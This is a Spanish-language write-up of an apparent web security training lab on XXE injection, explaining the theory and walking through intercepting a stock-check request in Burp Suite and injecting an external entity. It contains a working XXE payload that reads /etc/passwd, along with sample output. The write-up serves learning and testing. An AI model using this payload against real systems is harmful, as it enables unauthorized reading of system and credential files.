# 🗄️ XXE para leer archivos con entidades externas

## 📄 Descripción del laboratorio

Este laboratorio contiene una funcionalidad de **comprobación de stock** que procesa datos en formato **XML** enviados por el usuario.

Debido a una configuración insegura del parser XML, la aplicación es vulnerable a **XML External Entity (XXE)**, lo que permite leer archivos arbitrarios del sistema operativo.

El objetivo es:

* Explotar la vulnerabilidad XXE .
* Leer el contenido del archivo:

```
/etc/passwd
```



## 📚 Teoría

La vulnerabilidad **XXE (XML External Entity)** aparece cuando una aplicación:

* Acepta **XML controlado por el usuario**.
* Utiliza un **parser XML que permite entidades externas**.
* No deshabilita **DOCTYPE** ni restringe el acceso a recursos locales.

En XML es posible definir entidades dentro de un **DTD (Document Type Definition)**.

Las entidades pueden ser:

* **Internas**, con valores definidos dentro del documento.
* **Externas**, que apuntan a recursos del sistema.

Ejemplo de entidad externa:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

Cuando el parser procesa el documento:

1. Resuelve la entidad externa.
2. Accede al archivo especificado.
3. Sustituye la referencia `&xxe;` por el contenido real del archivo.

Si la aplicación refleja ese valor en la respuesta HTTP, el atacante puede leer archivos arbitrarios del sistema.

### 📌 Causa del problema

En este laboratorio el fallo ocurre porque:

* El parser XML permite **entidades externas**.
* No se deshabilita **DOCTYPE**.
* El contenido procesado se **refleja directamente en la respuesta**.

Esto permite realizar **lectura arbitraria de archivos del servidor**.



## 📝 Práctica

### 🎯 Objetivo

Leer el contenido del archivo:

```
/etc/passwd
```

mediante una inyección XXE.



### 1️⃣ Interceptar la petición XML

Accedemos a la funcionalidad **Check stock** de cualquier producto.

Interceptamos la petición con **Burp Suite** y la enviamos al **Repeater**.

<img width="768" height="376" alt="image" src="https://github.com/user-attachments/assets/58bd820d-7dd4-4b82-b031-c7b175599a3c" />
<br>
El cuerpo original de la petición tiene un formato similar a:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

La respuesta del servidor indica el número de unidades disponibles en stock.

Esto confirma que:

* El backend procesa datos en formato XML.
* Los valores enviados influyen directamente en la respuesta.



### 2️⃣ Comprobar reflexión de datos

Modificamos uno de los valores del XML, por ejemplo:

<img width="768" height="390" alt="image" src="https://github.com/user-attachments/assets/2b8bd628-7c07-4ee8-91c0-59dab73970b5" />
<br>
La aplicación no acepta el valor como válido, pero **lo refleja en la respuesta**.

Esto indica que el contenido del XML **se procesa y se devuelve sin escape**, lo que hace posible explotar XXE.



### 3️⃣ Inyectar una entidad externa

Añadimos un **DTD** que defina una entidad externa apuntando al archivo `/etc/passwd`.

La petición queda así:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>1</productId>
  <storeId>&xxe;</storeId>
</stockCheck>
```

En este XML:

* Se define la entidad externa `xxe`.
* Se indica que lea el archivo `/etc/passwd`.
* Se inserta la referencia `&xxe;` dentro del documento.



### 4️⃣ Enviar la petición

Enviamos el XML modificado desde **Burp Repeater**.

<img width="768" height="342" alt="image" src="https://github.com/user-attachments/assets/864ee9e4-2336-49c5-9824-51df7ab6ef61" />
<br>
El parser XML procesa el documento y resuelve la entidad externa.



### 5️⃣ Obtener el archivo

La respuesta HTTP devuelve directamente el contenido del archivo solicitado.

Por ejemplo:

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

Esto confirma que el servidor ha leído un archivo local y ha devuelto su contenido.



### 6️⃣ Resultado final

Se consigue:

* Inyectar una entidad externa XML.
* Forzar al parser a leer un archivo local.
* Obtener el contenido de `/etc/passwd`.

El laboratorio se completa correctamente.
